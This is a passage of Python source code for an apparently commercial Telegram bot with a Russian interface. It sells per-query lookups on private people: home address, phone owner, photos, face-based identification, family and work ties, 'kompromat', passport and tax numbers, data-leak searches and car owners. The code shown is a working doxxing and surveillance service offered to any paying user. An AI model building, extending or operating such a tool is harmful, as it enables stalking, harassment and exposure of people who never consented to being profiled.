        f"✅ <b>Оплата прошла!</b>\n\n⭐ Начислено: <b>{stars} звёзд</b>\n💰 Баланс: <b>{user['stars'] if user else '?'} ⭐</b>",
        parse_mode=ParseMode.HTML, reply_markup=main_menu()
    )
    await notify_admins(f"💰 Покупка: {uid} купил {stars}⭐ (charge: {payment.telegram_payment_charge_id})")


# Кнопки поиска
SEARCH_PROMPTS = {
    "ip_lookup":       ("🌐 Введите <b>IP-адрес</b>:\nПример: <code>8.8.8.8</code>", "ip_lookup"),
    "phone_lookup":    ("📞 Введите <b>номер телефона</b>:\nПример: <code>+79001234567</code>", "phone_lookup"),
    "person_search":   ("👤 Введите <b>ФИО</b>:\nПример: <code>Иванов Иван Иванович</code>", "person_search"),
    "photo_search":    ("📸 Введите <b>имя человека</b> для поиска фотографий:", "photo_search"),
    "address_search":  ("🏠 Введите <b>ФИО или запрос</b> для поиска адреса:", "address_search"),
    "kompromat":       ("🕵️ Введите <b>ФИО</b> для сбора компромата:", "kompromat"),
    "email_search":    ("📧 Введите <b>email</b>:\nПример: <code>user@mail.ru</code>", "email_search"),
    "username_search": ("👾 Введите <b>никнейм</b>:", "username_search"),
    "whois_lookup":    ("🔍 Введите <b>домен или IP</b>:\nПример: <code>google.com</code>", "whois_lookup"),
    "telegram_lookup": ("✈️ Введите <b>@username</b> или <b>ID</b> в Telegram:", "telegram_lookup"),
    "car_lookup":      ("🚗 Введите <b>гос.номер</b> автомобиля:\nПример: <code>А123БВ77</code>", "car_lookup"),
    "connections":     ("🔗 Введите <b>ФИО</b> для поиска связей:", "connections"),
    "doc_search":      ("📄 Введите <b>ФИО, паспорт, ИНН или СНИЛС</b>:", "doc_search"),
    "phone_to_ip":     ("🌍 Введите <b>номер телефона</b> для определения IP:", "phone_to_ip"),
    "housing_search":  ("🏘 Введите <b>ФИО или телефон</b> для поиска жилья:", "housing_search"),
    "deep_leaks":      ("🔓 Введите <b>ФИО, телефон, email или ник</b> для поиска утечек:", "deep_leaks"),
    "reverse_image":   ("📷 Отправьте <b>фотографию</b> для поиска личности:", "reverse_image"),
    "spiderfoot":      ("🕷 Введите цель для SpiderFoot:\nIP, домен, email или @ник:", "spiderfoot"),
    "full_dossier":    ("📋 Введите <b>ФИО</b> для полного досье:", "full_dossier"),
}

for cb_data, (prompt, action) in SEARCH_PROMPTS.items():
    async def _cb_handler(cb: CallbackQuery, _prompt=prompt, _action=action):
        await cb.answer()
        user_states[cb.from_user.id] = {"action": _action}
        await cb.message.answer(
            f"{_prompt}\n\n💰 Стоимость: {COSTS.get(_action, 0)} ⭐",
            parse_mode=ParseMode.HTML
        )
    dp.callback_query.register(_cb_handler, F.data == cb_data)


# Кнопки проверки ловушки
@dp.callback_query(F.data.startswith("trap_check:"))
async def cb_trap_check(cb: CallbackQuery):
    await cb.answer("🔍 Проверяю...")
    token = cb.data.split(":", 1)[1]
    await do_check_trap(cb.message, token)


# Кнопки админ-панели
@dp.callback_query(F.data == "adm_pending")
async def cb_adm_pending(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT telegram_id, phone FROM users WHERE allowed=0 AND banned=0") as cur:
            rows = await cur.fetchall()
    if not rows:
        return await cb.message.answer("Нет ожидающих.")
    kb = InlineKeyboardBuilder()
    msg = "⏳ <b>Ожидают подтверждения:</b>\n\n"
    for tid, phone in rows:
        msg += f"🆔 <code>{tid}</code>  📱 {phone or '—'}\n"
        kb.row(InlineKeyboardButton(text=f"✅ {tid}", callback_data=f"approve_{tid}"))
    await cb.message.answer(msg, parse_mode=ParseMode.HTML, reply_markup=kb.as_markup())


@dp.callback_query(F.data == "adm_stats")
async def cb_adm_stats(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    async with aiosqlite.connect(DB_PATH) as db:
        t  = (await db.execute_fetchall("SELECT COUNT(*) FROM users"))[0][0]
        a  = (await db.execute_fetchall("SELECT COUNT(*) FROM users WHERE allowed=1"))[0][0]
        rq = (await db.execute_fetchall("SELECT COUNT(*) FROM requests"))[0][0]
    await cb.message.answer(
        f"📊 <b>Статистика:</b>\n👥 {t}  ✅ {a}  📋 {rq}",
        parse_mode=ParseMode.HTML
    )


@dp.callback_query(F.data == "adm_users")
async def cb_adm_users(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT telegram_id, phone, stars, allowed, banned FROM users ORDER BY id DESC LIMIT 20"
        ) as cur:
            rows = await cur.fetchall()
    msg = f"👥 <b>Пользователи (последние {len(rows)}):</b>\n\n"
    for tid, phone, stars, allowed, banned in rows:
        st = "🚫" if banned else ("✅" if allowed else "⏳")
        msg += f"{st} <code>{tid}</code>  📱 {phone or '—'}  💰 {stars}⭐\n"
    await cb.message.answer(msg, parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "adm_admins")
async def cb_adm_admins(cb: CallbackQuery):
    await cb.answer()
    caller_admin = await get_admin(cb.from_user.id)
    if not caller_admin:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT a.telegram_id, a.is_super, u.phone FROM admins a LEFT JOIN users u ON a.telegram_id=u.telegram_id ORDER BY a.is_super DESC"
        ) as cur:
            rows = await cur.fetchall()
    kb  = InlineKeyboardBuilder()
    msg = "👮 <b>Администраторы бота:</b>\n\n"
    for tid, is_super, phone in rows:
        role = "👑 Супер-админ" if is_super else "🔐 Админ"
        msg += f"{role}\n🆔 <code>{tid}</code>  📱 {phone or '—'}\n\n"
        if not is_super and tid != cb.from_user.id:
            kb.row(InlineKeyboardButton(text=f"❌ Снять {tid}", callback_data=f"adm_remove:{tid}"))
    kb.row(InlineKeyboardButton(text="➕ Назначить админа", callback_data="adm_make_admin"))
    if caller_admin.get("is_super"):
        kb.row(InlineKeyboardButton(text="👑 Назначить супер-админа", callback_data="adm_make_super"))
    await cb.message.answer(msg, parse_mode=ParseMode.HTML, reply_markup=kb.as_markup())


@dp.callback_query(F.data.startswith("adm_remove:"))
async def cb_adm_remove(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    tid = int(cb.data.split(":")[1])
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM admins WHERE telegram_id = ? AND is_super = 0", (tid,))
        await db.commit()
    await cb.message.answer(f"✅ Права у <code>{tid}</code> сняты.", parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "adm_make_admin")
async def cb_adm_make_admin(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    user_states[cb.from_user.id] = {"action": "admin_make_admin"}
    await cb.message.answer("➕ Введите <b>Telegram ID</b> для назначения администратором:", parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "adm_make_super")
async def cb_adm_make_super(cb: CallbackQuery):
    await cb.answer()
    caller = await get_admin(cb.from_user.id)
    if not caller or not caller.get("is_super"):
        return await cb.message.answer("⛔ Только супер-администратор.")
    user_states[cb.from_user.id] = {"action": "admin_make_super"}
    await cb.message.answer("👑 Введите <b>Telegram ID</b> для назначения супер-администратором:", parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "adm_broadcast")
async def cb_adm_broadcast(cb: CallbackQuery):
    await cb.answer()
    if not await get_admin(cb.from_user.id):
        return
    user_states[cb.from_user.id] = {"action": "admin_broadcast"}
    await cb.message.answer("📢 Введите сообщение для рассылки всем активным пользователям:")


# ─── Обработчик текстовых сообщений ──────────────────────────────────────────
@dp.message(F.text)
async def handle_text(message: Message):
    uid  = message.from_user.id
    text = message.text.strip()
    if text.startswith("/"):
        return
    state = user_states.get(uid)
    if not state:
        return

    # Служебные состояния
    if state["action"] == "admin_broadcast":
        user_states.pop(uid)
        admin = await get_admin(uid)
        if not admin:
            return
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT telegram_id FROM users WHERE allowed=1 AND banned=0") as cur:
                rows = await cur.fetchall()
        ok = fail = 0
        for (tid,) in rows:
            try:
                await bot.send_message(tid, f"📢 <b>Сообщение от администратора:</b>\n\n{text}", parse_mode=ParseMode.HTML)
                ok += 1
            except Exception:
                fail += 1
        return await message.answer(f"📢 Рассылка: ✅ {ok}  ❌ {fail}")

    if state["action"] == "admin_make_admin":
        user_states.pop(uid)
        if not await get_admin(uid):
            return
        try:
            tid = int(text)
        except ValueError:
            return await message.answer("❌ Некорректный ID.")
        u = await get_user(tid)
        if not u:
            return await message.answer(f"❌ Пользователь <code>{tid}</code> не найден.", parse_mode=ParseMode.HTML)
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 0)", (tid,))
            await db.execute("UPDATE users SET allowed=1 WHERE telegram_id=?", (tid,))
            await db.commit()
        await message.answer(f"✅ <code>{tid}</code> назначен администратором.", parse_mode=ParseMode.HTML)
        try:
            await bot.send_message(tid, "🔐 <b>Вам выданы права администратора!</b>", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if state["action"] == "admin_make_super":
        user_states.pop(uid)
        caller = await get_admin(uid)
        if not caller or not caller.get("is_super"):
            return
        try:
            tid = int(text)
        except ValueError:
            return await message.answer("❌ Некорректный ID.")
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT OR REPLACE INTO admins (telegram_id, is_super) VALUES (?, 1)", (tid,))
            await db.execute("UPDATE users SET allowed=1 WHERE telegram_id=?", (tid,))
            await db.commit()
        await message.answer(f"👑 <code>{tid}</code> назначен супер-администратором.", parse_mode=ParseMode.HTML)
        return

    # Проверка авторизации
    ok = await deduct_and_proceed(message, state["action"], text)
    if not ok:
        user_states.pop(uid, None)
        return

    user_states.pop(uid)
    action = state["action"]

    try:
        if action == "ip_lookup":         await do_ip_lookup(message, text)
        elif action == "phone_lookup":    await do_phone_lookup(message, text)
        elif action == "person_search":   await do_person_search(message, text)
        elif action == "photo_search":    await do_photo_search(message, text)
        elif action == "address_search":  await do_address_search(message, text)
        elif action == "kompromat":       await do_kompromat(message, text)
        elif action == "email_search":    await do_email_search(message, text)
        elif action == "username_search": await do_username_search(message, text)
        elif action == "whois_lookup":    await do_whois(message, text)
        elif action == "telegram_lookup": await do_telegram_lookup(message, text)
        elif action == "car_lookup":      await do_car_lookup(message, text)
        elif action == "connections":     await do_connections(message, text)
        elif action == "doc_search":      await do_doc_search(message, text)
        elif action == "phone_to_ip":     await do_phone_to_ip(message, text)
        elif action == "housing_search":  await do_housing_search(message, text)
        elif action == "deep_leaks":      await do_deep_leaks(message, text)
        elif action == "spiderfoot":      await do_spiderfoot(message, text)
        elif action == "full_dossier":    await do_full_dossier(message, text)
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")


@dp.message(F.photo)
async def handle_photo(message: Message):
    uid   = message.from_user.id
    state = user_states.get(uid)
    if not state or state["action"] != "reverse_image":
        return
    ok = await deduct_and_proceed(message, "reverse_image", "photo")
    if not ok:
        user_states.pop(uid, None)
        return
    user_states.pop(uid)
    best = message.photo[-1]
    file = await bot.get_file(best.file_id)
    img_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file.file_path}"
    await do_reverse_image(message, img_url)


# ════════════════════════════════════════════════════════════════
#   ПОИСКОВЫЕ ФУНКЦИИ
# ════════════════════════════════════════════════════════════════

async def do_ip_lookup(msg: Message, ip: str):
    r = await http_get(
        f"http://ip-api.com/json/{ip}",
        params={"fields": "status,message,country,countryCode,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"},
        timeout=10
    )
    if not r or r.get("status") == "fail":
        return await msg.answer(f"❌ {r.get('message', 'Ошибка') if r else 'Ошибка запроса'}")

    flags = " ".join(f for f, v in [("📱 Мобильный", r.get("mobile")), ("⚠️ VPN/Прокси", r.get("proxy")), ("☁️ Хостинг", r.get("hosting"))] if v) or "Обычный"
    text = (
        f"🌐 <b>IP: <code>{r['query']}</code></b>\n\n"
        f"🌍 Страна: {r.get('country')} ({r.get('countryCode')})\n"
        f"🏙 Город: {r.get('city', '—')}\n"
        f"📍 Регион: {r.get('regionName', '—')}\n"
        f"📮 Индекс: {r.get('zip', '—')}\n"
        f"📡 Провайдер: {r.get('isp', '—')}\n"
        f"🏢 Организация: {r.get('org', '—')}\n"
        f"🔢 AS: {r.get('as', '—')}\n"
        f"🕐 Часовой пояс: {r.get('timezone', '—')}\n"
        f"📌 Координаты: <code>{r.get('lat')}, {r.get('lon')}</code>\n"
        f"🔎 Тип: {flags}\n\n"
        f"<a href=\"https://www.google.com/maps?q={r['lat']},{r['lon']}\">🗺 Google Maps</a>  "
        f"<a href=\"https://yandex.ru/maps/?ll={r['lon']},{r['lat']}&z=13\">🗺 Яндекс</a>"
    )
    await msg.answer(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    shodan = await shodan_lookup(ip)
    if shodan:
        ports = ", ".join(map(str, shodan.get("ports", []))) or "нет"
        vulns = ", ".join(shodan.get("vulns", [])) or "нет"
        await msg.answer(
            f"🔍 <b>Shodan InternetDB:</b>\n🔌 Порты: <code>{ports}</code>\n🚨 CVE: {vulns}\n"
            f"🔗 <a href=\"https://www.shodan.io/host/{ip}\">Открыть в Shodan</a>",
            parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )

    rev = await reverse_ip_lookup(ip)
    if rev:
        await msg.answer(
            f"🏠 <b>Другие сайты на этом IP ({len(rev)}):</b>\n\n" +
            "\n".join(f"• {s}" for s in rev[:15]),
            parse_mode=ParseMode.HTML
        )


async def do_phone_lookup(msg: Message, phone: str):
    clean = re.sub(r"[\s()\-−]", "", phone)
    r = await http_get(
        f"http://apilayer.net/api/validate?access_key={NUMVERIFY_KEY}&number={clean}&format=1",
        timeout=10
    )
    text = f"📞 <b>Номер: <code>{clean}</code></b>\n\n"
    if r and r.get("valid"):
        text += (
            f"✅ Действителен\n"
            f"🌍 Страна: {r.get('country_name')} ({r.get('country_code')})\n"
            f"📞 Оператор: {r.get('carrier', '—')}\n"
            f"📟 Тип: {r.get('line_type', '—')}\n"
            f"📍 Локация: {r.get('location', '—')}\n"
        )
    else:
        text += "ℹ️ Базовая валидация недоступна\n"
    await msg.answer(text, parse_mode=ParseMode.HTML)

    d = await google_search(f'"{clean}" владелец телефона ФИО')
    results = d.get("organic_results", [])
    if results:
        m = f"🔍 <b>Открытые данные по номеру:</b>\n\n"
        for i, res in enumerate(results[:5], 1):
            m += f"<b>{i}. {res['title']}</b>\n"
            if res.get("snippet"):
                m += f"{res['snippet']}\n"
            m += f"🔗 <a href=\"{res['link']}\">{res.get('domain', res['link'])}</a>\n\n"
        await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    enc = clean.replace("+", "%2B")
    await msg.answer(
        f"🔎 <b>Проверьте вручную:</b>\n\n"
        f"📞 <a href=\"https://getcontact.com/search?q={enc}\">GetContact</a>  "
        f"<a href=\"https://neberitrubku.ru/{enc}\">Небери трубку</a>  "
        f"<a href=\"https://www.truecaller.com/search/ru/{enc}\">Truecaller</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_person_search(msg: Message, query: str):
    d = await google_search(f'"{query}" биография')
    kg = d.get("knowledge_graph")
    if kg:
        kg_text = render_kg(kg)
        if kg_text:
            await msg.answer(kg_text, parse_mode=ParseMode.HTML)
        imgs = kg.get("images", [])
        if imgs:
            await send_photo_safe(msg, kg.get("title", query), imgs[0].get("image", ""))

    results = d.get("organic_results", [])
    if results:
        all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in results)
        c = extract_contacts(all_text)
        m = f"👤 <b>Поиск: {query}</b>\n"
        if c["phones"]:    m += f"\n📞 {', '.join(c['phones'])}"
        if c["addresses"]: m += f"\n📍 {' | '.join(c['addresses'][:2])}"
        m += "\n\n"
        for i, r in enumerate(results[:5], 1):
            m += f"<b>{i}. {r['title']}</b>\n"
            if r.get("snippet"):
                m += f"{r['snippet']}\n"
            m += f"🔗 <a href=\"{r['link']}\">{r.get('domain', r['link'])}</a>\n\n"
        await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    d2 = await google_search(f'"{query}" site:vk.com OR site:ok.ru OR site:t.me OR site:instagram.com')
    soc = d2.get("organic_results", [])
    if soc:
        sm = "📱 <b>Профили в соцсетях:</b>\n\n"
        for r in soc[:5]:
            net = "🔵 ВКонтакте" if "vk.com" in r.get("domain","") else "🟠 ОК" if "ok.ru" in r.get("domain","") else "✈️ Telegram" if "t.me" in r.get("domain","") else "🌐"
            sm += f"{net}: <a href=\"{r['link']}\">{r['title']}</a>\n\n"
        await msg.answer(sm, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    enc = query.replace(" ", "+")
    await msg.answer(
        f"🔎 <a href=\"https://www.rusprofile.ru/search?query={enc}&type=person\">Rusprofile</a>  "
        f"<a href=\"https://egrul.nalog.ru/\">ЕГРЮЛ</a>  "
        f"<a href=\"https://fssp.gov.ru/iss/ip/?name={enc}\">ФССП</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_photo_search(msg: Message, query: str):
    d = await google_search(query, engine="google_images", num=20)
    images = d.get("images", [])
    if not images:
        return await msg.answer(f"📭 Фотографии по запросу «{query}» не найдены.")
    await msg.answer(f"📸 <b>Фотографии: {query}</b>", parse_mode=ParseMode.HTML)
    sent = 0
    for img in images:
        if sent >= 6:
            break
        thumb = img.get("thumbnail") if isinstance(img.get("thumbnail"), str) and not img.get("thumbnail","").startswith("data:") else None
        orig  = img.get("original", {}).get("link")
        cap   = f"📸 {img.get('title', query)}"
        if await send_photo_safe(msg, cap, thumb, orig):
            sent += 1
    await msg.answer(f"✅ Отправлено: {sent} фото")


async def do_address_search(msg: Message, query: str):
    d = await google_search(f'"{query}" адрес проживания регистрации')
    results = d.get("organic_results", [])
    all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in results)
    c = extract_contacts(all_text)

    m = f"🏠 <b>Поиск адреса: {query}</b>\n\n"
    if c["addresses"]:
        m += "📍 <b>Найденные адреса:</b>\n" + "\n".join(f"  • {a}" for a in c["addresses"]) + "\n\n"
    if c["phones"]:
        m += f"📞 {', '.join(c['phones'])}\n\n"

    for i, r in enumerate(results[:5], 1):
        m += f"<b>{i}. {r['title']}</b>\n"
        if r.get("snippet"):
            m += f"{r['snippet']}\n"
        m += f"🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"

    if not results and not c["addresses"]:
        m += "📭 Адрес в открытых источниках не найден.\n\n"

    await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    enc = query.replace(" ", "+")
    await msg.answer(
        f"🔎 <a href=\"https://egrul.nalog.ru/\">ЕГРЮЛ</a>  "
        f"<a href=\"https://fssp.gov.ru/iss/ip/?name={enc}\">ФССП</a>  "
        f"<a href=\"https://kad.arbitr.ru/?ins[0]={enc}\">Арбитраж</a>  "
        f"<a href=\"https://sudact.ru/search/?query={enc}\">Суды</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_kompromat(msg: Message, query: str):
    await msg.answer(f"🕵️ <b>Компромат: {query}</b>\nЗапрашиваю параллельно...", parse_mode=ParseMode.HTML)
    news_d, court_d, debt_d = await asyncio.gather(
        google_search(f'"{query}" суд арест обвинение скандал мошенничество', engine="google_news", num=8),
        google_search(f'"{query}" приговор суд уголовное дело'),
        google_search(f'"{query}" банкротство долги ФССП'),
    )
    for label, d in [("📰 Новости:", news_d), ("⚖️ Судебные дела:", court_d), ("💸 Долги:", debt_d)]:
        results = d.get("organic_results", [])
        if results:
            m = f"<b>{label}</b>\n\n"
            for i, r in enumerate(results[:4], 1):
                m += f"<b>{i}. {r['title']}</b>\n"
                if r.get("snippet"): m += f"{r['snippet']}\n"
                m += f"🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"
            await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    enc = query.replace(" ", "+")
    await msg.answer(
        f"🗂 <a href=\"https://fssp.gov.ru/iss/ip/?name={enc}\">ФССП</a>  "
        f"<a href=\"https://sudact.ru/search/?query={enc}\">ГАС Правосудие</a>  "
        f"<a href=\"https://bankrot.fedresurs.ru/bankrupts?searchStr={enc}\">Реестр банкротств</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_email_search(msg: Message, email: str):
    main_d, social_d = await asyncio.gather(
        google_search(f'"{email}"'),
        google_search(f'"{email}" site:vk.com OR site:github.com OR site:linkedin.com'),
    )
    leak = await leakcheck_public(email)

    if leak and leak.get("found", 0) > 0:
        lm = f"🔓 <b>LeakCheck: {leak['found']} утечек!</b>\n"
        if leak.get("fields"):
            lm += "Поля: " + ", ".join(leak["fields"][:8]) + "\n"
        await msg.answer(lm, parse_mode=ParseMode.HTML)

    results = main_d.get("organic_results", [])
    if results:
        m = f"📧 <b>Email: <code>{email}</code></b>\n\n"
        for i, r in enumerate(results[:5], 1):
            m += f"<b>{i}. {r['title']}</b>\n{r.get('snippet','')}\n🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"
        await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    gh = await github_user_lookup(email.split("@")[0])
    if gh and gh.get("login"):
        gm = f"🐙 <b>GitHub: @{gh['login']}</b>\n"
        for k, v in [("name", "👤"), ("bio", "📝"), ("location", "📍"), ("email", "📧"), ("company", "🏢")]:
            if gh.get(k):
                gm += f"{v} {gh[k]}\n"
        await msg.answer(gm, parse_mode=ParseMode.HTML)
        if gh.get("avatar_url"):
            await send_photo_safe(msg, f"@{gh['login']}", gh["avatar_url"])

    enc = email.replace("@", "%40")
    await msg.answer(
        f"🔍 <a href=\"https://haveibeenpwned.com/account/{enc}\">HaveIBeenPwned</a>  "
        f"<a href=\"https://leakcheck.io/?query={enc}\">LeakCheck</a>  "
        f"<a href=\"https://dehashed.com/search?query={enc}\">Dehashed</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_username_search(msg: Message, username: str):
    clean = username.lstrip("@")
    social_d, tech_d = await asyncio.gather(
        google_search(f'"{clean}" site:vk.com OR site:ok.ru OR site:instagram.com OR site:twitter.com OR site:tiktok.com OR site:t.me OR site:reddit.com'),
        google_search(f'"{clean}" site:github.com OR site:gitlab.com OR site:stackoverflow.com'),
    )

    NETS = {"vk.com": "🔵 ВКонтакте", "ok.ru": "🟠 ОК", "instagram.com": "📷 Instagram",
            "twitter.com": "🐦 Twitter", "tiktok.com": "🎵 TikTok", "t.me": "✈️ Telegram",
            "reddit.com": "🟥 Reddit", "github.com": "🐙 GitHub"}

    all_res = social_d.get("organic_results", []) + tech_d.get("organic_results", [])
    if all_res:
        m = "📱 <b>Найденные профили:</b>\n\n"
        seen: set = set()
        for r in all_res[:10]:
            if r["link"] in seen:
                continue
            seen.add(r["link"])
            net = next((v for k, v in NETS.items() if k in r.get("domain", "")), "🌐")
            m += f"{net}: <a href=\"{r['link']}\">{r['title']}</a>\n"
            if r.get("snippet"):
                m += f"  <i>{r['snippet'][:80]}</i>\n"
            m += "\n"
        await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    gh = await github_user_lookup(clean)
    if gh and gh.get("login"):
        gm = f"🐙 <b>GitHub: @{gh['login']}</b>\n"
        for k, v in [("name", "👤"), ("bio", "📝"), ("location", "📍"), ("company", "🏢"), ("public_repos", "📦 Репо:"), ("followers", "👥 Подписчиков:")]:
            if gh.get(k):
                gm += f"{v} {gh[k]}\n"
        await msg.answer(gm, parse_mode=ParseMode.HTML)
        if gh.get("avatar_url"):
            await send_photo_safe(msg, f"@{gh['login']}", gh["avatar_url"])

    await msg.answer(
        f"🔗 <b>Прямые ссылки:</b>\n\n"
        f"🔵 <a href=\"https://vk.com/{clean}\">vk.com/{clean}</a>\n"
        f"✈️ <a href=\"https://t.me/{clean}\">t.me/{clean}</a>\n"
        f"🐙 <a href=\"https://github.com/{clean}\">github.com/{clean}</a>\n"
        f"🐦 <a href=\"https://twitter.com/{clean}\">twitter.com/{clean}</a>\n"
        f"📹 <a href=\"https://youtube.com/@{clean}\">youtube.com/@{clean}</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_whois(msg: Message, target: str):
    clean  = re.sub(r"^https?://", "", target).split("/")[0].lower()
    is_ip  = bool(RE_IP.match(clean))
    rdap_url = f"https://rdap.org/ip/{clean}" if is_ip else f"https://rdap.org/domain/{clean}"

    r = await http_get(rdap_url, timeout=12)
    m = f"🔍 <b>WHOIS: <code>{clean}</code></b>\n\n"
    if r and "error" not in str(r.get("errorCode", "")):
        if is_ip:
            if r.get("name"):       m += f"📋 Имя: {r['name']}\n"
            if r.get("country"):    m += f"🌍 Страна: {r['country']}\n"
            if r.get("startAddress"): m += f"📡 Диапазон: {r['startAddress']} — {r.get('endAddress','')}\n"
        else:
            m += f"🌐 Домен: {r.get('ldhName', clean)}\n"
            status = ", ".join(r.get("status", []))
            if status: m += f"📊 Статус: {status}\n"
            for ev in r.get("events", []):
                d = ev.get("eventDate", "")[:10]
                if ev.get("eventAction") == "registration": m += f"📅 Зарегистрирован: {d}\n"
                if ev.get("eventAction") == "expiration":   m += f"⏳ Истекает: {d}\n"
            ns = [n.get("ldhName","") for n in r.get("nameservers", [])]
            if ns: m += f"🖥 NS: {', '.join(ns)}\n"
    else:
        m += "ℹ️ RDAP не ответил.\n"

    await msg.answer(m, parse_mode=ParseMode.HTML)

    if not is_ip:
        subs = await crtsh_lookup(clean)
        if subs:
            await msg.answer(
                f"🔒 <b>Субдомены (crt.sh): {len(subs)}</b>\n\n" +
                "\n".join(f"• <code>{s}</code>" for s in subs[:20]),
                parse_mode=ParseMode.HTML
            )
        dns = await dns_lookup(clean)
        if dns:
            await msg.answer(f"📡 <b>DNS (HackerTarget):</b>\n\n<code>{dns[:1000]}</code>", parse_mode=ParseMode.HTML)
        wb = await wayback_lookup(clean)
        if wb:
            ts  = wb.get("timestamp", "")
            fmt = f"{ts[:4]}-{ts[4:6]}-{ts[6:8]}" if len(ts) >= 8 else ts
            await msg.answer(
                f"📚 <b>Wayback Machine:</b>\n📅 {fmt}\n🔗 <a href=\"{wb['url']}\">Открыть архив</a>",
                parse_mode=ParseMode.HTML, disable_web_page_preview=True
            )

    await msg.answer(
        f"🔗 <a href=\"https://who.is/whois/{clean}\">who.is</a>  "
        f"<a href=\"https://crt.sh/?q=%.{clean}\">crt.sh</a>  "
        f"<a href=\"https://urlscan.io/search/#domain:{clean}\">urlscan.io</a>  "
        f"<a href=\"https://web.archive.org/web/*/{clean}\">Wayback</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_telegram_lookup(msg: Message, query: str):
    clean = query.lstrip("@")
    try:
        chat = await bot.get_chat(f"@{clean}" if not clean.isdigit() else int(clean))
        m = f"✈️ <b>Telegram: @{clean}</b>\n\n"
        m += f"🆔 ID: <code>{chat.id}</code>\n"
        if chat.username:    m += f"👤 Username: @{chat.username}\n"
        if hasattr(chat, "first_name") and chat.first_name: m += f"📛 Имя: {chat.first_name} {getattr(chat,'last_name','') or ''}\n"
        if chat.bio:         m += f"📖 Bio: {chat.bio}\n"
        if chat.description: m += f"📝 Описание: {chat.description}\n"
        await msg.answer(m, parse_mode=ParseMode.HTML)
        try:
            photos = await bot.get_user_profile_photos(chat.id, limit=1)
            if photos.total_count > 0:
                ph  = photos.photos[0][-1]
                url = await bot.get_file(ph.file_id)
                await send_photo_safe(msg, f"@{clean}", f"https://api.telegram.org/file/bot{BOT_TOKEN}/{url.file_path}")
        except Exception:
            pass
    except Exception:
        await msg.answer(f"ℹ️ Профиль @{clean} приватный или не найден. Ищу в Google...")

    d = await google_search(f'"@{clean}" OR "t.me/{clean}" Telegram')
    results = d.get("organic_results", [])
    if results:
        m = "🔍 <b>Упоминания:</b>\n\n"
        for i, r in enumerate(results[:4], 1):
            m += f"<b>{i}. {r['title']}</b>\n{r.get('snippet','')}\n🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"
        await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


async def do_car_lookup(msg: Message, plate: str):
    clean = plate.upper().replace(" ", "")
    d1, d2 = await asyncio.gather(
        google_search(f'"{clean}" автомобиль владелец'),
        google_search(f'"{clean}" site:avtocod.ru OR site:carinfo.ru OR site:gibdd-check.ru'),
    )
    m = f"🚗 <b>Авто: {clean}</b>\n\n"
    all_text = " ".join(f"{r.get('title','')} {r.get('snippet','')}" for r in d1.get("organic_results", []))
    c = extract_contacts(all_text)
    if c["phones"]: m += f"📞 {', '.join(c['phones'])}\n"
    for i, r in enumerate(d1.get("organic_results", [])[:4], 1):
        m += f"<b>{i}. {r['title']}</b>\n{r.get('snippet','')}\n🔗 <a href=\"{r['link']}\">{r.get('domain','')}</a>\n\n"
    await msg.answer(m, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    await msg.answer(
        f"🔎 <a href=\"https://avtocod.ru/check-auto?freeReportInput={clean}\">avtocod.ru</a>  "
        f"<a href=\"https://carinfo.ru/\">carinfo.ru</a>  "
        f"<a href=\"https://xn--90adear.xn--p1ai/check/fines#{clean}\">ГИБДД штрафы</a>",
        parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )


async def do_connections(msg: Message, query: str):
    fam_d, work_d = await asyncio.gather(
        google_search(f'"{query}" (жена OR муж OR брат OR сестра OR дети OR родители)'),
        google_search(f'"{query}" (коллеги OR партнёр OR компания OR директор OR должность)'),
    )
